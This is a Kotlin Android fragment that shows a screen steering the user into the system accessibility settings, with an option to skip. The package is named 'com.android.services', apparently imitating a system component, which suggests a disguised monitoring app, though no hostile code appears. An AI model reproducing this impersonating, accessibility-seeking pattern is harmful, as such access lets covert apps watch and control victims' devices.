package com.android.services.ui.fragments

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.databinding.DataBindingUtil
import androidx.fragment.app.activityViewModels
import com.android.services.R
import com.android.services.databinding.FragmentAccessibilityBinding
import com.android.services.enums.PermissionScreens
import com.android.services.interfaces.CustomDialogListener
import com.android.services.util.AppUtils
import com.android.services.viewModel.ManualPermissionViewModel

class AccessibilityFragment : BaseFragment() {

    lateinit var binding: FragmentAccessibilityBinding
    private val manualPermissionViewModel: ManualPermissionViewModel by activityViewModels()

    override fun initViews(view: View) {
        binding.permissionButton.setOnClickListener {
            accessibilityPermission()
        }

        binding.skipPermission.setOnClickListener {
            AppUtils.showAlertDialog(
                requireContext(),
                "Skip Permission",
                "Alert! Some features may not work if You Skip the Permission",
                "Skip",
                "Cancel",
                object : CustomDialogListener {
                    override fun onYes() {
                        AppUtils.skipThePermission(PermissionScreens.ACCESSIBILITY_PERMISSION)
                    }

                    override fun onCancel() {

                    }
                }
            )
        }
    }

    override fun createView(inflater: LayoutInflater, container: ViewGroup): View {
        binding = DataBindingUtil.inflate<FragmentAccessibilityBinding>(
            inflater, R.layout.fragment_accessibility, container, false
        ).apply {
            lifecycleOwner = viewLifecycleOwner
            viewModel = manualPermissionViewModel
        }
        return binding.root
    }

    override fun onCreateFragment() {

    }

    private fun accessibilityPermission() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
        intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK
        intent.flags = Intent.FLAG_ACTIVITY_NO_HISTORY
        intent.flags = Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
        startActivity(intent)
    }

    companion object {
        /** Creates an new instance of Accessibility Fragment **/
        fun newInstance(): AccessibilityFragment {
            val args = Bundle()
            val fragment = AccessibilityFragment()
            fragment.arguments = args
            return fragment
        }
    }
}